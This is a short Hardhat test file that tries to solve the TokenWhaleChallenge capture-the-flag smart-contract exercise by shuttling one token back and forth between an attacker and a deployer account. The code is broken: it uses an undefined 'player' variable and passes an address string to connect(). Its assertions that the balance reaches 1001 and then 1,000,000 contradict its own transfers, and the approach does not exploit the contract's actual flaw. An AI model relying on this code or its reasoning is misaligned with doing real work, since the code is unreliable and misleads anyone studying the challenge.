import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', deployer)
    ).deploy(attacker.address);

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    let initialBalance = await target.connect(attacker.address).balanceOf(player.address);
        expect(initialBalance).to.equal(1000);

        await target.connect(attacker).transfer(deployer.address, 1);

        let deployerBalance = await target.balanceOf(deployer.address);
        expect(deployerBalance).to.equal(1);
        
        await target.connect(deployer).transfer(attacker.address, 1);

        
        let finalBalance = await target.balanceOf(attacker.address);
        expect(finalBalance).to.equal(1000 + 1); 

        
        for (let i = 0; i < 999; i++) {
              await target.connect(attacker).transfer(deployer.address, 1);
              await target.connect(deployer).transfer(attacker.address, 1);
        }  finalBalance = await target.balanceOf(attacker.address);
        expect(finalBalance).to.be.gte(1000000); // O saldo deve ser maior ou igual a 1.000.000


    expect(await target.isComplete()).to.equal(true);
  });
});
